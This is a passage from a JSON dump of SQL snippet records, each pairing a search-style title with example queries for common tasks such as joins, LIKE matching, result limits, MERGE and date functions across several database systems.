    "description": "SELECT * FROM `TABLE1` JOIN `TABLE2` ON `TABLE1`.`id` = `TABLE2`.`COMMA_SEPERATED_COLUMN`  AND `TABLE2`.`COMMA_SEPERATED_COLUMN` REGEXP \"(^|,)SPECIFIC_ID(,|$)\"  ############## OR #######################  SELECT * FROM table1  LEFT JOIN table2 ast ON ast.nodeid = c_NodeId  AND ',' + ast.GroupNames + ',' LIKE '%,' + table1.GroupAlphabet + ',%';\nselect SM.ROLLNO,        SM.NAME,         SM.ADDRESS,        (        select ','+CM.CourseName        from dbo.CourseMaster as CM        where ','+SM.Course+',' like '%,'+CM.CourseId+',%'        for xml path(''), type        ).value('substring(text()[1], 2)', 'varchar(max)') as Course from dbo.StudentMaster as SM; \n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3975,
    "keyword": null,
    "link": null,
    "title": " sql join on wildcard",
    "description": "select * from tableA a where exists (select 1 from tableB b where  a.id like '%' + b.id + '%');\nselect * from tableA a join      tableB b      on a.id like '%' + b.id + '%';\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3976,
    "keyword": null,
    "link": null,
    "title": " sql join one to many",
    "description": "SELECT   * FROM        Parent P INNER JOIN  Child  C     ON      C.ParentId = P.ParentId\nSELECT      P.Name             , P.Address             , SUM(C.Amount) FROM        Parent P INNER JOIN  Child  C     ON      C.ParentId = P.ParentId GROUP BY    P.Name             , P.Address\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3977,
    "keyword": null,
    "link": null,
    "title": " sql join two queries",
    "description": "SELECT t1.Activity, t1.\"Total Amount 2009\", t2.\"Total Amount 2008\" FROM (query1) as t1, (query2) as t2 WHERE t1.Activity = t2.Activity \n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3978,
    "keyword": null,
    "link": null,
    "title": " sql last 7 days",
    "description": " SELECT id, NewsHeadline as news_headline, NewsText as news_text, state CreatedDate as created_on  FROM News   WHERE CreatedDate >= DATEADD(day,-7, GETDATE())\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3979,
    "keyword": null,
    "link": null,
    "title": " sql last updated",
    "description": "select * from sys.objects order by modify_date desc \nUPDATE TableName SET column1 = 1, column2 = 2 OUTPUT DELETED.* WHERE <condition>;\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3980,
    "keyword": null,
    "link": null,
    "title": " sql last week",
    "description": "select id from tbname  where date between date_sub(now(),INTERVAL 1 WEEK) and now();\nselect id from tbname where date between date_sub(now(),INTERVAL 1 WEEK) and now();\nselect min(date), max(date) from calendar where week = datepart(week, getdate() - 7) and year = datepart(year, getdate() - 7)\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3981,
    "keyword": null,
    "link": null,
    "title": " sql left characters",
    "description": "-- For Oracle only  -- syntax  SUBSTR(<main-string>,1,<number-of-characters>)  -- example  SUBSTR('Useless stuff',1,10) -- OUTPUT: Useless st  -- practical example SELECT SUBSTR('Useless stuff',1,10) FROM DUAL;\n-- For Oracle only  -- syntax  SUBSTR(<main-string>,-<number-of-characters>)  -- example  SUBSTR('Useless stuff',-9) -- OUTPUT: ess stuff  -- practical example SELECT SUBSTR('Useless stuff',-9) FROM DUAL;\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3982,
    "keyword": null,
    "link": null,
    "title": " sql left join",
    "description": "/*Two tables: CUSTOMERS table and ORDERS table. ORDERS table contains STATUS attribute.*/ SELECT      customers.customerNumber,      customerName,      orderNumber,      status FROM     customers LEFT JOIN orders ON      orders.customerNumber = customers.customerNumber;\nSELECT table1.column1, table2.column2... FROM table1 LEFT JOIN table2 ON table1.common_field = table2.common_field; \nSELECT * FROM table_1 RIGHT JOIN table_2 ON table_1.common_field = table_2.common_field;\nSELECT * FROM  (SELECT [column] FROM [table]) a LEFT JOIN (SELECT [column1], [columnn2] FROM [table]) b ON a.column = b.column1\nSELECT * FROM  (SELECT [UserID] FROM [User]) a LEFT JOIN (SELECT [TailUser], [Weight] FROM [Edge] WHERE [HeadUser] = 5043) b ON a.UserId = b.TailUser\n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3983,
    "keyword": null,
    "link": null,
    "title": " sql left join 2 tables",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3984,
    "keyword": null,
    "link": null,
    "title": " sql left join multiple tables with conditions",
    "description": "SELECT TableA.*, TableB.*, TableC.*, TableD.* FROM TableA     JOIN TableB         ON TableB.aID = TableA.aID     JOIN TableC         ON TableC.cID = TableB.cID     JOIN TableD         ON TableD.dID = TableA.dID WHERE DATE(TableC.date)=date(now())  \n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3985,
    "keyword": null,
    "link": null,
    "title": " sql left outer join vs left join",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\nLEFT OUTER JOIN: is used when retrieving data from multiple tables and will return left table and any matching right table records.  RIGHT OUTER JOIN: is used when retrieving data from multiple tables and will return right table and any matching left table records \n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3986,
    "keyword": null,
    "link": null,
    "title": " sql length",
    "description": "SELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n-- Relevant for SQL-Oracle only  -- syntax LENGTH(<your-string>)  -- example LENGTH('CountCharacters') -- OUTPUT: 15         123456789012345  -- example with query  SELECT 'CountCharacters',LENGTH('CountCharacters') FROM DUAL;  -- OUTPUT: CountCharacters, 15\n-- Relevant for MS SQL (SQL Server) LEN('string')\nSELECT LENGTH('exemple');\n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3987,
    "keyword": null,
    "link": null,
    "title": " sql like",
    "description": "WHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"\n#SELECT * FROM table_name WHERE columnName LIKE pattern; SELECT * FROM wilayah_2020 WHERE kode LIKE \"82%\"   kode\t\t\tnama \t --------------------------------- 82.72.08 \t\tTidore Timur 82.72.08.1001 \tMafututu 82.72.08.1002 \tTosa 82.72.08.1003 \tDowora 82.72.08.1004 \tKalaodi 82.72.08.1005 \tCobodoe 82.72.08.1006 \tDoyado 82.72.08.1007 \tJiko Cobo  # 'a%'\tFinds any values that start with \"a\" # '%a'\tFinds any values that end with \"a\" # '%or%'\tFinds any values that have \"or\" in any position # '_r%'\tFinds any values that have \"r\" in the second position # 'a_%'\tFinds any values that start with \"a\" and are at least 2 characters in length # 'a__%'\tFinds any values that start with \"a\" and are at least 3 characters in length # 'a%o'\tFinds any values that start with \"a\" and ends with \"o\"\nSELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n-- example SELECT Id, ProductName, UnitPrice, Package   FROM Product  WHERE ProductName LIKE 'Cha_' OR ProductName LIKE 'Chan_'\neturns true if the operand value matches a pattern. Example: Returns true if the user&rsquo;s first_name ends with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name LIKE '%son'; \n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3988,
    "keyword": null,
    "link": null,
    "title": " sql like case sensitive",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n-- Postgresql case insensitive: SELECT * FROM people WHERE name ILIKE 'JOHN' -- John -- JOHN -- john\nSELECT 1 FROM dbo.Customers WHERE   CustID = @CustID COLLATE SQL_Latin1_General_CP1_CS_AS     AND CustPassword = @CustPassword COLLATE SQL_Latin1_General_CP1_CS_AS \nSELECT DISTINCT COL_NAME FROM myTable WHERE UPPER(COL_NAME) LIKE UPPER('%PriceOrder%') # or SELECT DISTINCT COL_NAME FROM myTable WHERE LOWER(COL_NAME) LIKE LOWER('%PriceOrder%') \n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3989,
    "keyword": null,
    "link": null,
    "title": " sql like variable",
    "description": "ALTER PROCEDURE <Name> (     @PartialName VARCHAR(50) = NULL )  SELECT Name      FROM <table>     WHERE Name LIKE '%' + LTRIM(RTRIM(@PartialName)) + '%'\n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3990,
    "keyword": null,
    "link": null,
    "title": " sql limit decimal places",
    "description": "SELECT CAST(ROUND(125.025000, 2) AS NUMERIC(36,2)) returns: 125.03\n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3991,
    "keyword": null,
    "link": null,
    "title": " sql limit order by",
    "description": "-- MySql SELECT * FROM emp ORDER BY sal DESC LIMIT 5;\t -- SQL Server  SELECT TOP 5 * FROM emp ORDER BY sal DESC;\t -- Oracle < 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\nSELECT name FROM column_names ORDER BY name ASC LIMIT 3;\nSELECT expressions FROM tables [WHERE conditions] [ORDER BY expression [ ASC | DESC ]] LIMIT number_rows [ OFFSET offset_value ];\n",
    "reg_date": "2021-10-12T10:00:21.000Z"
  },
  {
    "id": 3992,
    "keyword": null,
    "link": null,
    "title": " sql limit results returned",
    "description": "-- MySql SELECT * FROM emp ORDER BY sal DESC LIMIT 5;\t -- SQL Server  SELECT TOP 5 * FROM emp ORDER BY sal DESC;\t -- Oracle < 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 3993,
    "keyword": null,
    "link": null,
    "title": " sql limit to 5 results",
    "description": "-- MySql SELECT * FROM emp ORDER BY sal DESC LIMIT 5;\t -- SQL Server  SELECT TOP 5 * FROM emp ORDER BY sal DESC;\t -- Oracle < 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\nSELECT expressions FROM tables [WHERE conditions] [ORDER BY expression [ ASC | DESC ]] LIMIT number_rows [ OFFSET offset_value ];\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 3994,
    "keyword": null,
    "link": null,
    "title": " sql limit with offset",
    "description": "LIMIT row_count OFFSET offset;\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 3995,
    "keyword": null,
    "link": null,
    "title": " sql list dates between two dates",
    "description": "DECLARE @MinDate DATE = '20140101',         @MaxDate DATE = '20140106';  SELECT  Date FROM    dbo.Calendar WHERE   Date >= @MinDate AND     Date < @MaxDate;\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 3996,
    "keyword": null,
    "link": null,
    "title": " sql list users and roles",
    "description": "-- SQL Server: list of users and roles SELECT dp.NAME      AS principal_name,        dp.TYPE_DESC AS principal_type_desc,        o.NAME       AS object_name,        p.PERMISSION_NAME,        p.STATE_DESC AS permission_state_desc FROM sys.database_permissions p          LEFT OUTER JOIN sys.all_objects o                          ON p.MAJOR_ID = o.OBJECT_ID          INNER JOIN sys.database_principals dp                     ON p.GRANTEE_PRINCIPAL_ID = dp.PRINCIPAL_ID;\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 3997,
    "keyword": null,
    "link": null,
    "title": " sql make sure every user is unqiuew",
    "description": "create table user(     user_id  INT  auto_increment  PRIMARY KEY,     username varchar(50) not null,     avator  varchar(50),     gender  boolean not null,     phone varchar(20),     unique(username) );  create table journey(     id INT auto_increment PRIMARY KEY,     start varchar(100) not null,     dest varchar(100) not null,     time date not null,     person INT,     user_id INT not null,     foreign key(user_id) references user(user_id) ); \n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 3998,
    "keyword": null,
    "link": null,
    "title": " sql management studio display line numbers",
    "description": "-- SQL Server Management Studio:  Tools -> Options > Text Editor > Transact-SQL > General > Display > Line numbers\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 3999,
    "keyword": null,
    "link": null,
    "title": " sql max count",
    "description": "SELECT max(MY_COLUMN) FROM my_table;  SELECT MY_ID, max(MY_COLUMN) FROM my_table GROUP BY ID;   -- Max by MY_ID\n● SELECT first-name, MAX(salary) FROM department d LEFT OUTER JOIN employee e ON (d.department_id = e.department_id) GROUP BY department_id;\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 4000,
    "keyword": null,
    "link": null,
    "title": " sql max of two values",
    "description": "-- For SQL Server >= 2008 SELECT [Other Fields],   (SELECT Max(v)     FROM (VALUES (date1), (date2), (date3),...) AS value(v)) as [MaxDate] FROM [YourTableName]  /* Note (from comments): From value(v), \"value\" is the alias for the   * virtual table and \"v\" is the name of the virtual column of the date values.  */\n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 4001,
    "keyword": null,
    "link": null,
    "title": " sql max value in column",
    "description": "SELECT MAX(<numeric column>) FROM <table>; SELECT MAX(<numeric column>) FROM <table> GROUP BY <other column>;\nSELECT MAX(salary) FROM employees; SELECT id, MAX(salary) FROM employees GROUP BY id;  SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\nALTER TABLE dbo.mytable ADD CONSTRAINT CK_HAPPINESS_MAX CHECK (PokemonHappiness <= 10000) \n",
    "reg_date": "2021-10-12T10:00:22.000Z"
  },
  {
    "id": 4002,
    "keyword": null,
    "link": null,
    "title": " sql merge",
    "description": "MERGE esqlProductTarget T USING esqlProductSource S ON (S.ProductID = T.ProductID) WHEN MATCHED       THEN UPDATE      SET    T.Name = S.Name,             T.ProductNumber = S.ProductNumber,             T.Color = S.Color WHEN NOT MATCHED BY TARGET THEN INSERT (ProductID, Name, ProductNumber, Color)      VALUES (S.ProductID, S.Name, S.ProductNumber, S.Color) WHEN NOT MATCHED BY SOURCE THEN DELETE;\nMERGE dbo.MyTarget targ USING (SELECT ... FROM dbo.MySource GROUP BY .....) src ON (targ.Identifier = src.Identifier     AND targ.Name = src.ConstituentName     AND targ.Ticker = src.ConstituentTicker     AND (targ.CUSIP = src.CUSIP OR targ.ISIN = src.ISIN OR targ.SEDOL = src.SEDOL)) WHEN MATCHED THEN -- update values ;\n-- Oracle: Example for Insert or update in t1 from t2 values  MERGE INTO table1 t1 USING table2 t2 ON (t1.CODE = t2.ID) WHEN MATCHED THEN     UPDATE SET t1.COL1 = t2.VALUE1 WHEN NOT MATCHED THEN     INSERT (CODE, COL1)  VALUES (t2.ID, t2.VALUE1);\n                                     MERGE sales.category t      USING sales.category_staging s ON (s.category_id = t.category_id) WHEN MATCHED     THEN UPDATE SET          t.category_name = s.category_name,         t.amount = s.amount WHEN NOT MATCHED BY TARGET      THEN INSERT (category_id, category_name, amount)          VALUES (s.category_id, s.category_name, s.amount) WHEN NOT MATCHED BY SOURCE      THEN DELETE; \nMERGE table1 USING (SELECT table3.keycolumn,               table2.DataColumn1,               table2.DataColumn2        FROM table2        INNER JOIN table3            ON table2.anotherKey = table3.anotherKey        WHERE table2.anotherKey = 'A1') tmpTable ON     table1.keyColumn = tmpTable.keyColumn WHEN MATCHED THEN        UPDATE        SET table1.DataColumn1 = tmpTable.DataColumn1             ,table1.DataColumn2 = tmpTable.DataColumn2;\nMERGE LoginTypes T         USING (SELECT 'System' as Description) S         ON(S.Description = T.Description) WHEN NOT MATCHED BY TARGET     THEN INSERT(Description, CreatedTimestamp, LastUpdatedTimestamp) VALUES('System', getdate(), getdate());\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4003,
    "keyword": null,
    "link": null,
    "title": " sql min",
    "description": "select min(name_of_column) alias_name from name_of_table;\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4004,
    "keyword": null,
    "link": null,
    "title": " sql min and max in same query",
    "description": "SELECT MIN(salary), MAX(salary) FROM employees; SELECT team, MIN(salary), MAX(salary) FROM employees GROUP BY team;\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4005,
    "keyword": null,
    "link": null,
    "title": " sql min datetime",
    "description": "ex1: SELECT MIN (ord_date) AS \"Min Date\"  FROM orders;\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4006,
    "keyword": null,
    "link": null,
    "title": " sql missing records from another table",
    "description": "-- Returns missing my_table1 ID in my_table2  SELECT DISTINCT t1.* FROM my_table t1 LEFT OUTER JOIN my_table2 t2 ON t1.ID = t2.ID WHERE t2.ID is null; -- Or: SELECT t1.* FROM my_table1 t1 WHERE NOT EXISTS     (SELECT ID FROM my_table2 t2 WHERE t2.ID = t1.ID); -- Or: SELECT t1.* FROM my_table1 t1 WHERE t1.ID NOT IN     (SELECT ID FROM my_table2 t2 WHERE t2.ID = t1.ID);\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4007,
    "keyword": null,
    "link": null,
    "title": " sql missing values",
    "description": "-- Find missing t1 values in t2 (based on 'id' field) SELECT * FROM t1 WHERE t1.id NOT IN (SELECT id FROM t2); -- or SELECT * FROM t1 WHERE NOT exists (     SELECT NULL FROM t2 WHERE t2.id = t1.id ); -- or SELECT t1.* FROM t1 LEFT OUTER JOIN t2 ON t2.id = t1.id WHERE t2.id IS NULL;\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4008,
    "keyword": null,
    "link": null,
    "title": " sql mode=only full group by",
    "description": "mysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\nmysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); \n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4009,
    "keyword": null,
    "link": null,
    "title": " sql money c# data type",
    "description": "System.Decimal\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4010,
    "keyword": null,
    "link": null,
    "title": " sql multi column index performance",
    "description": "CREATE INDEX idx_actor_name ON ACTOR (LAST_NAME, FIRST_NAME);  SELECT * FROM CUSTOMER c WHERE ADDRESS_ID = 10 AND exists(     SELECT 1 FROM ACTOR a     WHERE c.FIRST_NAME = a.FIRST_NAME       AND c.LAST_NAME = a.LAST_NAME );\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4011,
    "keyword": null,
    "link": null,
    "title": " sql multiline comment",
    "description": "/* */\n/* Comment */\nsql comment\n",
    "reg_date": "2021-10-12T10:00:23.000Z"
  },
  {
    "id": 4012,
    "keyword": null,
    "link": null,
    "title": " sql multiple column index",
    "description": "CREATE INDEX idx_actor_name ON ACTOR (LAST_NAME, FIRST_NAME);  SELECT * FROM CUSTOMER c WHERE ADDRESS_ID = 10 AND exists(     SELECT 1 FROM ACTOR a     WHERE c.FIRST_NAME = a.FIRST_NAME       AND c.LAST_NAME = a.LAST_NAME );\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4013,
    "keyword": null,
    "link": null,
    "title": " sql multiple insert postgres",
    "description": "                                     INSERT INTO table_name (column_list) VALUES     (value_list_1),     (value_list_2),     ...     (value_list_n);\nINSERT INTO User (name, surname, \"roomId\") // roomId is with quetes(\"\") because it is case sensitive in this example   VALUES      ('Joe', 'Travolta', 1),     ('Jim', 'Carrey', 2),     ('Shakira', 'whenever', 3); // remember about semicolon(;) at the end\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4014,
    "keyword": null,
    "link": null,
    "title": " sql myisam vs innodb",
    "description": "SELECT TABLE_NAME,  ENGINE FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'database' and ENGINE = 'myISAM'\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4015,
    "keyword": null,
    "link": null,
    "title": " sql nested if statement in select",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4016,
    "keyword": null,
    "link": null,
    "title": " sql nested select",
    "description": "SELECT * FROM students WHERE notes > ( SELECT AVG(notes) FROM students );  SELECT * FROM students WHERE class_id = (     SELECT id FROM classes WHERE number_of_students = (         SELECT MAX(number_of_students) FROM classes     ) );  SELECT subject, MAX(salary_by_subject.avg_salary) AS max_salary FROM (     SELECT subject, AVG(monthly_salary) AS avg_salary     FROM teachers     GROUP BY subject ) salary_by_subject;\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4017,
    "keyword": null,
    "link": null,
    "title": " sql not",
    "description": "SELECT * FROM Customers WHERE Country NOT IN ('Germany', 'France', 'UK');\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \n/* AND is a operator that allows you to combine two conditions Both conditions must be true for the row to b e included in the result set */ SELECT column_name(s) FROM table_name WHERE column_1 = value_1 AND column_2 = value_2;\nReturns true if a record DOESN&rsquo;T meet the condition. Example: Returns true if the user&rsquo;s first_name doesn&rsquo;t end with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name NOT LIKE '%son';\nSQL NOT IN operator is used to filter the result if the values that are mentioned as part of the IN operator is not satisfied. Let&rsquo;s discuss in detail about SQL NOT IN operator.  Syntax: SELECT Column(s) FROM table_name WHERE Column NOT IN (value1, value2... valueN);\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC';\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4018,
    "keyword": null,
    "link": null,
    "title": " sql not a group by expression",
    "description": "SELECT a, b, sum(c) FROM my_table GROUP BY a;\t\t-- Error SELECT a, b, sum(c) FROM my_table GROUP BY a, b;\t-- OK, all expressions there -- CASE WHEN statement, for example: SELECT a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END AS r, sum(c)  FROM my_table GROUP BY a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END;\t\t-- No alias name (r)\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4019,
    "keyword": null,
    "link": null,
    "title": " sql not contains",
    "description": "SELECT * FROM tbl WHERE tbl.col NOT LIKE '%text%';\n/*Return data with the exception of the identified values*/ SELECT COLUMN1, COLUMN2 ... FROM SCHEMA_NAME.TABLE_NAME WHERE NOT (COLUMN1 LIKE '%VALUE%');\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4020,
    "keyword": null,
    "link": null,
    "title": " sql not equal",
    "description": "<>\tNot equal. Note: In some versions of SQL this operator may be written as !=  Example sql query:  1) Selecting groceries where price is not 20 SELECT * FROM Grocery WHERE Price <> 20;\n<> Not Equal  != Not Equal\nrow <> value\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4021,
    "keyword": null,
    "link": null,
    "title": " sql not in",
    "description": "SELECT * FROM Customers WHERE Country NOT IN ('Germany', 'France', 'UK');\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \nReturns true if a record DOESN&rsquo;T meet the condition. Example: Returns true if the user&rsquo;s first_name doesn&rsquo;t end with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name NOT LIKE '%son';\nSQL NOT IN operator is used to filter the result if the values that are mentioned as part of the IN operator is not satisfied. Let&rsquo;s discuss in detail about SQL NOT IN operator.  Syntax: SELECT Column(s) FROM table_name WHERE Column NOT IN (value1, value2... valueN);\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC';\nselect * from TableName(nolock) where onlineUser!=('Y')\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4022,
    "keyword": null,
    "link": null,
    "title": " sql not null",
    "description": "SELECT column_name FROM table_name  WHERE column_name IS NOT NULL;\nSELECT column_names FROM table_name WHERE column_name IS NOT NULL;\nSELECT column_name FROM table_name  WHERE column_name IS NULL;\nSELECT * FROM my_table WHERE my_column IS NOT NULL;\nSELECT FIRST_NAME , MANAGER_ID  FROM EMPLOYEES  WHERE MANAGER_ID IS NOT NULL ;\nALTER TABLE ime_tabele ALTER stolpec SET NOT NULL;\n",
    "reg_date": "2021-10-12T10:00:24.000Z"
  },
  {
    "id": 4023,
    "keyword": null,
    "link": null,
    "title": " sql now",
    "description": "Add GETDATE() in sql query where you want to pass current timestamp.  Example Return the current database system date and time:  SELECT GETDATE();\nSELECT getdate()\nselect now();\nCURRENT_TIMESTAMP   \nSELECT NOW(); -- Cela va retourner une date de la forme : -- \t\tYYYY-MM-DD HH:MM:SS -- Par exemple : 2020-10-11 13:06:53\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4024,
    "keyword": null,
    "link": null,
    "title": " sql numeric functions",
    "description": "ABS Returns the absolute value of the given number. ACOS Returns the arc cosine of the given number. ASIN Returns the arc sine of the given number. ATAN Returns the arc tangent of one or 2 given numbers. ATAN2 Return the arc tangent of 2 given numbers. AVG Returns the average value of the given expression. CEIL Returns the closest whole number (integer) upwards from a given decimal point number. CEILING Same as CEIL. COS Returns the cosine of a given number. COT Returns the cotangent of a given number. COUNT Returns the amount of records that are returned by a SELECT query. DEGREES Converts a radians value to degrees. DIV Allows you to divide integers. EXP Returns e to the power of the given number. FLOOR Returns the closest whole number (integer) downwards from a given decimal point number. GREATEST Returns the highest value in a list of arguments. LEAST Returns the smallest value in a list of arguments. LN Returns the natural logarithm of the given number LOG Returns the natural logarithm of the given number, or the logarithm of the given number to the given base LOG10 Does the same as LOG, but to base 10. LOG2 Does the same as LOG, but to base 2. MAX Returns the highest value from a set of values. MIN Returns the lowest value from a set of values. MOD Returns the remainder of the given number divided by the other given number. PI Returns PI. POW Returns the value of the given number raised to the power of the other given number. POWER Same as POW. RADIANS Converts a degrees value to radians. RAND Returns a random number. ROUND Round the given number to the given amount of decimal places. SIGN Returns the sign of the given number. SIN Returns the sine of the given number. SQRT Returns the square root of the given number. SUM Returns the value of the given set of values combined. TAN Returns the tangent of the given number. TRUNCATE Returns a number truncated to the given number of decimal places.\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4025,
    "keyword": null,
    "link": null,
    "title": " sql only five first row",
